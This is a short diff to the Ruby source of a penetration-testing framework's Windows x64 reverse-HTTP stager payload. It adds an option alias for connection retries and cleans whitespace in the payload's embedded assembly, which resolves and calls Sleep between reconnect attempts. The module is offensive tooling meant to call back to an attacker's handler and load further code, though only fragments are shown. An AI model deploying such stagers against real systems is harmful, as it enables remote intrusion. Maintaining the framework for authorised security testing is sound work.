@@ -29,7 +29,8 @@ module Payload::Windows::ReverseHttp_x64
     super
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
-        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10],
+          aliases: ['ReverseConnectRetries']),
         OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
@@ -366,13 +367,13 @@ module Payload::Windows::ReverseHttp_x64
         call rbp
         test eax, eax
         jnz allocate_memory
-           
+
       set_wait:
         mov rcx, #{retry_wait}        ; dwMilliseconds
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
         call rbp                      ; Sleep( dwMilliseconds );
     ^
-    
+
 
     if retry_count > 0
       asm << %Q^
